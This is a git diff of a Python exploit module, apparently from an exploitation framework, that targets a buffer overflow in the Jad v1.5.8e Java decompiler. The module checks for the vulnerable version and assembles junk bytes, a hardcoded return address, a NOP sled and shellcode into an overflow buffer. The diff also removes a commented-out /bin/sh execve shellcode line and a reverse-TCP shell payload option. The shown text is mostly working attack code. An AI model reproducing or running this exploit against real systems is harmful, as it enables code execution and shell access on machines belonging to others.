@@ -1,4 +1,4 @@
-from subprocess import call
+from subprocess import call, Popen, PIPE
 from os import errno
 from module_payload import PayloadModule
 
@@ -13,13 +13,13 @@ class BoomerModule(PayloadModule):
                 "Arch" : "X86"
                 }
         options = {}
-        compatible = ["msf/linux/x86/shell_reverse_tcp", "local/linux/open_local_shell"]
+        compatible = ["local/linux/open_local_shell"]
         super(BoomerModule, self).__init__(options,info, compatible)
                
     def check(self):
         try:
             response = Popen(["jad"], stdout=PIPE, stderr=PIPE).communicate()[0]
-            if b"Jad v1.5.8e." in response:
+            if b"v1.5.8e" in response:
                 self.print_ok("Vulnerable")
             else:
                 self.print_error("No Vulnerable")
@@ -34,9 +34,8 @@ class BoomerModule(PayloadModule):
             self.print_info("Select a payload -> put payload <option>")
             return
         else:
-            #TODO
             shellcode = self.payload.get_shellcode()
-            #shellcode = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
         esp = b"\x18\x2e\x0e\x08" 
         buffer = junk + esp + nops + shellcode
         try:
